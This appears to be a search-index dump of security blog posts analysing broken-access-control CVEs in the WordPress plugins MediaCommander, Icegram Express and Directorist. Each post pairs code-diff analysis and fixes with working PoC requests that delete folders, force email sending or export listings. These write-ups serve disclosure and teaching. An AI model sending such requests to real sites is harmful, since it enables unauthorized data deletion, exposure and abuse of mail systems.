control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never allow dynamic callbacks to execute without checking permissions. The lp-load-ajax endpoint can become a vulnerability if the callback list is not restricted. Always validate nonce or check referer/domain to reduce risks from invalid requests. Patches should hardcode the callback list and combine it with admin privilege checks for sensitive functions. Broken Access Control often occurs in AJAX/REST APIs when developers trust input data from the client. ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress LearnPress Plugin \u003c= 4.3.1 is vulnerable to Broken Access Control ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin.","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Plugin The MediaCommander – Bring Folders to Media, Posts, and Pages for WordPress has an unauthorized data deletion vulnerability due to missing capability check at the REST API endpoint import-csv in all versions ≤ 2.3.1. The root cause is that this endpoint only checks for upload_files capability (Author level) for a destructive action that can delete all folders. This allows an authenticated attacker, with Author or higher privileges, to delete all folder organization data created by Administrators and other users. CVE ID: CVE-2025-14508 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 2.3.1 Patched Versions: 2.4.0 CVSS severity: Low (6.5) Required Privilege: Author Product: WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - MediaCommander – Bring Folders to Media, Posts, and Pages: 2.3.1 – vulnerable 2.4.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a REST API endpoint /import-csv with POST method as follows: FolderController.php v2.3.1 register_rest_route( MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1 '/import-csv', [ 'methods' =\u003e \\WP_REST_Server::CREATABLE, // POST 'callback' =\u003e [ $this, 'importCSV' ], 'permission_callback' =\u003e [ $this, 'canUploadFiles' ] ] ); permission_callback is canUploadFiles to check capabilities: public function canUploadFiles() { return current_user_can( 'upload_files' ); } upload_files capability is for users from Author level and above. If the user lacks the capability, the REST API returns 403. If the user has the capability, the callback importCSV is executed: FolderController.php v2.3.1 public function importCSV( \\WP_REST_Request $request ) { $params = $request-\u003eget_file_params(); $file = $params['file']['tmp_name']; $clear = filter_var( $request-\u003eget_param( 'clear' ), FILTER_VALIDATE_BOOLEAN ); $attachments = filter_var( $request-\u003eget_param( 'attachments' ), FILTER_VALIDATE_BOOLEAN ); $data = FoldersModel::importCSV( $file, $clear, $attachments ); $response = isset( $data ) ? [ 'success' =\u003e true, 'data' =\u003e $data ] : [ 'success' =\u003e false ]; return new \\WP_REST_Response( $response ); } importCSV performs: Retrieves the CSV file from the request. Retrieves the clear and attachments parameters and converts them to boolean. Calls FoldersModel::importCSV to process the CSV data. Returns JSON containing success and data (if any) or success: false on failure. Warning The clear parameter will delete all existing folders if set to true. Clear parameter Patch (v2.4.0) fixes the vulnerability by changing the capability check logic: FolderController.php v2.4.0 register_rest_route( MEDIACOMMANDER_PLUGIN_REST_URL, '/import-csv', [ 'methods' =\u003e \\WP_REST_Server::CREATABLE, 'callback' =\u003e [ $this, 'importCSV' ], 'permission_callback' =\u003e [ $this, 'canManageOptions' ] ] ); permission_callback is canManageOptions FolderController.php v2.4.0 public function canManageOptions() { return current_user_can( 'manage_options' ); } manage_options capability is for users from Administrator level and above. ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Authenticated user (Author+)\"] --\u003e B[\"POST /wp-json/mediacommander/v1/import-csv\"] B --\u003e C[\"permission_callback: canUploadFiles()\"] C --\u003e D{\"Has upload_files capability?\"} D -- Yes --\u003e E[\"importCSV() executes\"] D -- No --\u003e Z[\"403 Forbidden\"] E --\u003e F[\"Read CSV file and parameters (clear, attachments)\"] F --\u003e G{\"clear == true?\"} G -- Yes --\u003e H[\"Delete all existing folders\"] H --\u003e K[\"Broken Access Control: destructive action allowed for Author\"] graph TD A[\"Authenticated user (Author+)\"] --\u003e B[\"POST /wp-json/mediacommander/v1/import-csv\"] B --\u003e C[\"permission_callback: canUploadFiles()\"] C --\u003e D{\"Has upload_files capability?\"} D -- Yes --\u003e E[\"importCSV() executes\"] D -- No --\u003e Z[\"403 Forbidden\"] E --\u003e F[\"Read CSV file and parameters (clear, attachments)\"] F --\u003e G{\"clear == true?\"} G -- Yes --\u003e H[\"Delete all existing folders\"] H --\u003e K[\"Broken Access Control: destructive action allowed for Author\"] graph TD A[\"Authenticated user (Author+)\"] --\u003e B[\"POST /wp-json/mediacommander/v1/import-csv\"] B --\u003e C[\"permission_callback: canUploadFiles()\"] C --\u003e D{\"Has upload_files capability?\"} D -- Yes --\u003e E[\"importCSV() executes\"] D -- No --\u003e Z[\"403 Forbidden\"] E --\u003e F[\"Read CSV file and parameters (clear, attachments)\"] F --\u003e G{\"clear == true?\"} G -- Yes --\u003e H[\"Delete all existing folders\"] H --\u003e K[\"Broken Access Control: destructive action allowed for Author\"] graph TD A[\"Authenticated user (Author+)\"] --\u003e B[\"POST /wp-json/mediacommander/v1/import-csv\"] B --\u003e C[\"permission_callback: canUploadFiles()\"] C --\u003e D{\"Has upload_files capability?\"} D -- Yes --\u003e E[\"importCSV() executes\"] D -- No --\u003e Z[\"403 Forbidden\"] E --\u003e F[\"Read CSV file and parameters (clear, attachments)\"] F --\u003e G{\"clear == true?\"} G -- Yes --\u003e H[\"Delete all existing folders\"] H --\u003e K[\"Broken Access Control: destructive action allowed for Author\"] ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with Author account Retrieve the nonce from the response: Nonce in response Send request with the X-WP-Nonce header set to the nonce value from the response: curl -X POST \"http://localhost/wp-json/mediacommander/v1/import-csv\" \\ -H \"Cookie: Author cookie\" \\ -H \"X-WP-Nonce: 7323b67e07\" \\ -F \"file=@./file.csv\" \\ -F \"clear=true\" \\ -F \"attachments=false\" ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-14508 shows that the plugin MediaCommander ≤ 2.3.1 allows Author or higher users to perform full folder deletion of other users via the REST API import-csv. The root cause is missing proper capability checks for destructive actions. Patch 2.4.0 fixes this by raising the capability check to Administrator (manage_options), preventing unauthorized deletion. ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Always assign capabilities according to the risk level of the action (destructive actions should be Administrator only). Capability checks in REST API must match the nature of the operation, not just basic rights like upload_files. Parameters like clear can cause total data loss, so handle carefully and combine with proper capability checks. Correct use of nonce and cookies cannot compensate for broken access control. ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin \u003c= 2.3.1 is vulnerable to Broken Access Control ","date":"2025-12-15","objectID":"/posts/2025-12-15-cve-2025-14508/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-14508 Analysis \u0026 POC","uri":"/posts/2025-12-15-cve-2025-14508/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Email Subscribers \u0026 Newsletters Plugin.","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Icegram Express – Email Subscribers, Newsletters and Marketing Automation plugin for WordPress is affected by an Authorization vulnerability in versions up to and including 5.9.10. The root cause is that the plugin does not properly validate user permissions when performing actions in the trigger_mailing_queue_sending function. This allows unauthenticated attackers to force the system to send emails immediately, bypass the sending schedule, increase server load, and modify the plugin’s state (for example: last-cron-hit), thereby enabling abuse or DoS-like effects. CVE ID: CVE-2025-12349 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 5.9.10 Patched Versions: 5.9.11 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress Email Subscribers \u0026 Newsletters Plugin ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Email Subscribers \u0026 Newsletters: 5.9.10 – vulnerable 5.9.11 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the following action hook: class-es-queue.php v5.9.10 add_action( 'wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending', array( $this, 'trigger_mailing_queue_sending' ) ); The wp_ajax_nopriv_ hook is a mechanism that allows all users, including unauthenticated users, to access WordPress AJAX endpoints. Therefore, when accessing the endpoint /wp-admin/admin-ajax.php with the parameter: action=ig_es_trigger_mailing_queue_sending WordPress will directly invoke the callback trigger_mailing_queue_sending without any authentication or authorization checks, allowing anyone to trigger the email sending cron logic, bypass the schedule, and modify the internal state of the plugin. class-es-queue.php v5.9.10 public function trigger_mailing_queue_sending() { // Call cron action only when it is not locked. if ( ! ES()-\u003ecron-\u003eis_locked() ) { // Start processing of campaigns which are scheduled for current date time. do_action( 'ig_es_cron_worker' ); } } The trigger_mailing_queue_sending() function is responsible for triggering the plugin’s email sending cron process. First, the function checks the cron lock status via ES()-\u003ecron-\u003eis_locked(). If the cron is locked, the function does nothing, preventing multiple email-sending processes from running concurrently. If the cron is not locked, the function calls do_action( 'ig_es_cron_worker' ). Two callbacks are registered for the ig_es_cron_worker action hook: class-es-queue.php v5.9.10 add_action( 'ig_es_cron_worker', array( \u0026$this, 'process_campaigns' ), 10 ); add_action( 'ig_es_cron_worker', array( \u0026$this, 'process_queue' ), 30 ); This hook invokes callbacks based on priority: process_campaigns() runs first and process_queue() runs afterward. class-es-queue.php v5.9.10 public function process_campaigns() { if ( ES()-\u003ecron-\u003eshould_unlock() ) { ES()-\u003ecron-\u003eunlock(); } ES()-\u003ecron-\u003eset_last_hit(); // ... $es_c_croncount = ES()-\u003emailer-\u003eget_total_emails_send_now(); if ( $es_c_croncount \u003e 0 ) { // ... $notification = ES_DB_Mailing_Queue::get_notification_to_be_sent( $campaign_hash ); $notification_guid = isset( $notification['hash'] ) ? $notification['hash'] : null; $campaign_id = isset( $notification['campaign_id'] ) ? $notification['campaign_id'] : 0; // ... if ( ! is_null( $notification_guid ) ) { $cron_job = 'ig_es_cron_worker'; // ... if ( ! $this-\u003eis_cron_job_locked( $cron_job ) ) { $locking_status = $this-\u003elock_cron_job( $cron_job ); if ( 'locked' === $locking_status ) { // ... ES_DB_Mailing_Queue::update_sent_status( $notification_guid, 'Sending' ); // ... $emails_data = ES_DB_Sending_Queue::get_emails_to_be_sent_by_hash( $notification_guid, $es_c_croncount ); if ( count( $emails_data ) \u003e 0 ) { // ... ES()-\u003emailer-\u003esend( $notification['subject'], $notification['body'], array_column( $emails_data, 'email' ), array( 'guid' =\u003e $notification_guid ) ); // ... if ( ES_DB_Sending_Queue::get_total_emails_to_be_sent_by_hash( $notification_guid ) === 0 ) { ES_DB_Mailing_Queue::update_sent_status( $notification_guid, 'Sent' ); } // ... } $this-\u003eunlock_cron_job( $cron_job ); } } } } } process_campaigns() function: Unlocks the cron if needed and updates the cron execution timestamp. Retrieves the maximum number of emails that can be sent in a single run. Retrieves pending campaigns from ig_es_mailing_queue. Checks and locks the cron job to prevent concurrent execution. Updates the campaign status to Sending. Retrieves the list of emails to be sent based on the batch size from ig_es_sending_queue. Performs bulk email sending. If all emails have been sent, updates the campaign status to Sent. Finally, unlocks the cron job to allow subsequent runs. class-es-queue.php v5.9.10 public function process_queue() { global $wpdb; if ( ES()-\u003ecron-\u003eshould_unlock() ) { ES()-\u003ecron-\u003eunlock(); } ES()-\u003ecron-\u003eset_last_hit(); $email_sending_limit = ES()-\u003emailer-\u003eget_total_emails_send_now(); if ( $email_sending_limit \u003e 0 ) { $micro_time = microtime( true ); ... $notifications = $wpdb-\u003eget_resul","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending\"] B --\u003e C[\"wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook\"] C --\u003e D[\"trigger_mailing_queue_sending() is executed\"] D --\u003e E{\"Capability check?\"} E -- No --\u003e F[\"No permission validation\"] F --\u003e G{\"Nonce verification?\"} G -- No --\u003e H[\"No CSRF protection\"] H --\u003e I{\"Cron locked?\"} I -- No --\u003e J[\"do_action('ig_es_cron_worker')\"] J --\u003e K[\"process_campaigns()\"] J --\u003e L[\"process_queue()\"] K --\u003e M[\"Force email campaigns to send immediately\"] L --\u003e N[\"Force queued emails to be sent\"] M --\u003e O[\"Bypass schedule \u0026 update campaign states\"] N --\u003e O O --\u003e P[\"Broken Access Control / Abuse / DoS-like behavior\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending\"] B --\u003e C[\"wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook\"] C --\u003e D[\"trigger_mailing_queue_sending() is executed\"] D --\u003e E{\"Capability check?\"} E -- No --\u003e F[\"No permission validation\"] F --\u003e G{\"Nonce verification?\"} G -- No --\u003e H[\"No CSRF protection\"] H --\u003e I{\"Cron locked?\"} I -- No --\u003e J[\"do_action('ig_es_cron_worker')\"] J --\u003e K[\"process_campaigns()\"] J --\u003e L[\"process_queue()\"] K --\u003e M[\"Force email campaigns to send immediately\"] L --\u003e N[\"Force queued emails to be sent\"] M --\u003e O[\"Bypass schedule \u0026 update campaign states\"] N --\u003e O O --\u003e P[\"Broken Access Control / Abuse / DoS-like behavior\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending\"] B --\u003e C[\"wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook\"] C --\u003e D[\"trigger_mailing_queue_sending() is executed\"] D --\u003e E{\"Capability check?\"} E -- No --\u003e F[\"No permission validation\"] F --\u003e G{\"Nonce verification?\"} G -- No --\u003e H[\"No CSRF protection\"] H --\u003e I{\"Cron locked?\"} I -- No --\u003e J[\"do_action('ig_es_cron_worker')\"] J --\u003e K[\"process_campaigns()\"] J --\u003e L[\"process_queue()\"] K --\u003e M[\"Force email campaigns to send immediately\"] L --\u003e N[\"Force queued emails to be sent\"] M --\u003e O[\"Bypass schedule \u0026 update campaign states\"] N --\u003e O O --\u003e P[\"Broken Access Control / Abuse / DoS-like behavior\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending\"] B --\u003e C[\"wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook\"] C --\u003e D[\"trigger_mailing_queue_sending() is executed\"] D --\u003e E{\"Capability check?\"} E -- No --\u003e F[\"No permission validation\"] F --\u003e G{\"Nonce verification?\"} G -- No --\u003e H[\"No CSRF protection\"] H --\u003e I{\"Cron locked?\"} I -- No --\u003e J[\"do_action('ig_es_cron_worker')\"] J --\u003e K[\"process_campaigns()\"] J --\u003e L[\"process_queue()\"] K --\u003e M[\"Force email campaigns to send immediately\"] L --\u003e N[\"Force queued emails to be sent\"] M --\u003e O[\"Bypass schedule \u0026 update campaign states\"] N --\u003e O O --\u003e P[\"Broken Access Control / Abuse / DoS-like behavior\"] ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send request as an unauthenticated user: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost action=ig_es_trigger_mailing_queue_sending ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-12349 originates from the Icegram Express plugin registering an AJAX endpoint with wp_ajax_nopriv_ without performing any capability checks or nonce verification in the trigger_mailing_queue_sending function. This allows unauthenticated users to directly trigger the plugin’s internal cron, leading to forced email sending, schedule bypass, campaign state updates, and unnecessary system load. The patch in version 5.9.11 fully resolves the issue by adding capability checks and nonce verification before allowing cron logic execution. ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never attach sensitive logic to wp_ajax_nopriv_ without proper permission checks. WordPress AJAX endpoints must always combine capability checks and nonce verification. Cron or background processes with system impact should be protected like administrative actions. Broken Access Control can lead to functional abuse even without direct data leakage. ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress Email Subscribers \u0026 Newsletters Plugin \u003c= 5.9.10 is vulnerable to Broken Access Control ","date":"2025-12-14","objectID":"/posts/2025-12-14-cve-2025-12349/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12349 Analysis \u0026 POC","uri":"/posts/2025-12-14-cve-2025-12349/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Directorist Plugin.","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Directorist: AI-Powered Business Directory Plugin with Classified Ads Listings plugin for WordPress contains an unauthorized access vulnerability due to missing permission validation for the AJAX actions directorist_prepare_listings_export_file and directorist_type_slug_change in all versions up to 8.5.2. This allows an authenticated attacker with Subscriber or higher privileges to export listing data and change the directorist slug. CVE ID: CVE-2025-12174 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 8.5.2 Patched Versions: 8.5.3 CVSS severity: Medium (6.5) Required Privilege: Subcriber Product: WordPress Directorist Plugin ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Directorist: 8.5.2 – vulnerable 8.5.3 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers two action hooks: class-ajax-handler.php v8.5.2 add_action( 'wp_ajax_directorist_prepare_listings_export_file', [ $this, 'handle_prepare_listings_export_file_request' ] ); add_action( 'wp_ajax_directorist_type_slug_change', [ $this, 'directorist_type_slug_change' ] ); The wp_ajax_ hooks are only for logged-in users (from Subscriber upward). These actions call their respective handler functions. handler functions. 1. wp_ajax_directorist_prepare_listings_export_file: class-listings-export.php v8.5.2 public function handle_prepare_listings_export_file_request() { if ( ! directorist_verify_nonce() ) { $data['success'] = false; $data['message'] = __( 'Something is wrong! Please refresh and retry.', 'directorist' ); return wp_send_json( $data ); } $file = Directorist\\Listings_Exporter::get_prepared_listings_export_file(); wp_send_json( $file ); } This function returns all Directory Listings in a .csv file generated by get_prepared_listings_export_file(): class-listings-export.php v8.5.2 public static function get_prepared_listings_export_file() { $filename = \"listings-export-data\"; $file_name = \"{$filename}.csv\"; $file_contents = self::get_listings_data_as_csv_content(); $old_file_id = get_directorist_option( 'directorist_export_attachent_id', '', true ); if ( ! empty( $old_file_id ) ) { wp_delete_attachment( $old_file_id, true ); } $upload_dir = wp_upload_dir(); if ( wp_mkdir_p( $upload_dir['path'] ) ) { $file = $upload_dir['path'] . '/' . $file_name; } else { $file = $upload_dir['basedir'] . '/' . $file_name; } file_put_contents( $file, $file_contents ); $wp_filetype = wp_check_filetype( $file_name, null ); $attachment = [ 'post_mime_type' =\u003e $wp_filetype['type'], 'post_title' =\u003e sanitize_file_name( $filename ), 'post_content' =\u003e '', 'post_status' =\u003e 'inherit' ]; $attach_id = wp_insert_attachment( $attachment, $file ); $attach_url = wp_get_attachment_url( $attach_id ); update_directorist_option( 'directorist_export_attachent_id', $attach_id ); return [ 'success' =\u003e true, 'file_url' =\u003e $attach_url ]; } The returned path is the file_url value in the resulting array: return [ 'success' =\u003e true, 'file_url' =\u003e $attach_url ]; Specifically: The CSV file is created in the WordPress uploads directory, e.g.: wp-content/uploads/2025/01/listings-export-data.csv Then the file is registered as an attachment, and WordPress generates a public access URL, which is returned via file_url, e.g.: https://example.com/wp-content/uploads/2025/01/listings-export-data.csv Directory Listings can be found at: http://localhost/wp-admin/edit.php?post_type=at_biz_dir Danh sách các Directory Listings 2. wp_ajax_directorist_type_slug_change: class-ajax-handler.php v8.5.2 public function directorist_type_slug_change() { if ( ! directorist_verify_nonce() ) { wp_send_json( [ 'error' =\u003e __( 'Session expired, please reload the window and try again.', 'directorist' ), ] ); } $type_id = isset( $_POST['type_id'] ) ? sanitize_key( $_POST['type_id'] ) : ''; $update_slug = isset( $_POST['update_slug'] ) ? sanitize_key( $_POST['update_slug'] ) : ''; $directory_slugs = []; $listing_types = directorist_get_directories(); if ( $listing_types ) { foreach ( $listing_types as $listing_type ) { $directory_slugs[] = $listing_type-\u003eslug; if ( $type_id == $listing_type-\u003eterm_id ) { $old_slug = $listing_type-\u003eslug; } } } if ( in_array( $update_slug, $directory_slugs ) ) { wp_send_json( [ 'error' =\u003e __( 'This slug already in use.', 'directorist' ), 'old_slug' =\u003e ! empty( $old_slug ) ? $old_slug : '', ] ); } else { $update_type_slug = wp_update_term( $type_id, ATBDP_TYPE, [ 'slug' =\u003e $update_slug ] ); if ( $update_type_slug ) { wp_send_json( [ 'success' =\u003e __( 'Slug changes successfully.', 'directorist' ), ] ); } } } This function allows changing the slug of any Listing Type with type_id and update_slug obtained from the POST request. Notice that both callbacks call directorist_verify_nonce to enforce CSRF protection using the default action directorist_nonc","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Logged-in user (Subscriber or higher)\"] --\u003e B[\"Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change\"] B --\u003e C[\"wp_ajax_* hook is triggered\"] C --\u003e D[\"Callback executes\"] D --\u003e E{\"Is nonce valid?\"} E -- No --\u003e F[\"Return error\"] E -- Yes --\u003e G[\"Process request\"] G --\u003e H{\"Is capability checked?\"} H -- No --\u003e I[\"Subscriber or higher can export all listings or change any directory slug\"] I --\u003e J[\"Broken Access Control\"] graph TD A[\"Logged-in user (Subscriber or higher)\"] --\u003e B[\"Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change\"] B --\u003e C[\"wp_ajax_* hook is triggered\"] C --\u003e D[\"Callback executes\"] D --\u003e E{\"Is nonce valid?\"} E -- No --\u003e F[\"Return error\"] E -- Yes --\u003e G[\"Process request\"] G --\u003e H{\"Is capability checked?\"} H -- No --\u003e I[\"Subscriber or higher can export all listings or change any directory slug\"] I --\u003e J[\"Broken Access Control\"] graph TD A[\"Logged-in user (Subscriber or higher)\"] --\u003e B[\"Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change\"] B --\u003e C[\"wp_ajax_* hook is triggered\"] C --\u003e D[\"Callback executes\"] D --\u003e E{\"Is nonce valid?\"} E -- No --\u003e F[\"Return error\"] E -- Yes --\u003e G[\"Process request\"] G --\u003e H{\"Is capability checked?\"} H -- No --\u003e I[\"Subscriber or higher can export all listings or change any directory slug\"] I --\u003e J[\"Broken Access Control\"] graph TD A[\"Logged-in user (Subscriber or higher)\"] --\u003e B[\"Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change\"] B --\u003e C[\"wp_ajax_* hook is triggered\"] C --\u003e D[\"Callback executes\"] D --\u003e E{\"Is nonce valid?\"} E -- No --\u003e F[\"Return error\"] E -- Yes --\u003e G[\"Process request\"] G --\u003e H{\"Is capability checked?\"} H -- No --\u003e I[\"Subscriber or higher can export all listings or change any directory slug\"] I --\u003e J[\"Broken Access Control\"] ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with a Subscriber account and obtain the directorist_nonce from the response Lấy nonce từ response Send request: Retrieve Directory Listings POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: sub_cookie ... action=directorist_prepare_listings_export_file\u0026directorist_nonce=22a1e53ab7 Change the slug of any Listing Type POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: sub_cookie ... action=directorist_type_slug_change\u0026directorist_nonce=22a1e53ab7\u0026type_id=580\u0026update_slug=payload ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in Directorist \u003c= 8.5.2 arises from the lack of authorization checks on two privileged AJAX actions. Although the plugin uses nonces to defend against CSRF, this does not act as a permission check, resulting in any authenticated user, including Subscriber, being able to export complete listing data or arbitrarily change slugs — actions intended only for Administrators. The patch in v8.5.3 completely fixes the issue by adding a manage_atbdp_options capability check, restoring proper authorization boundaries. 